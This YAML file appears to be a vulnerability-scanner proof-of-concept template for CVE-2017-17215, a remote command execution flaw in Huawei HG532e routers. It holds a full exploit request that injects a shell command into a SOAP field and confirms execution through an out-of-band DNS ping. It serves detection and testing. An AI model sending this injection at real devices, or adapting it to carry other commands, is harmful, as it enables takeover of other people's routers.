pocs/afrog-pocs/CVE/2017/CVE-2017-17215.yaml

id: CVE-2017-17215

info:
  name: 华为HG532e远程命令执行漏洞
  author: zan8in
  severity: critical
  verified: false
  description: |-
    华为HG532e路由器存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限
  tags: huawei,rce
  created: 2025/02/14

set:
  oob: oob()
  oobDNS: oob.DNS()
rules:
  r0:
    request:
      method: POST
      path: /ctrlt/DeviceUpgrade_1
      headers:
        Authorization: "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
      body: |
        <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>;/bin/busybox ping {{oobDNS}};</NewStatusURL><NewDownloadURL>HUAWEIUPNP</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
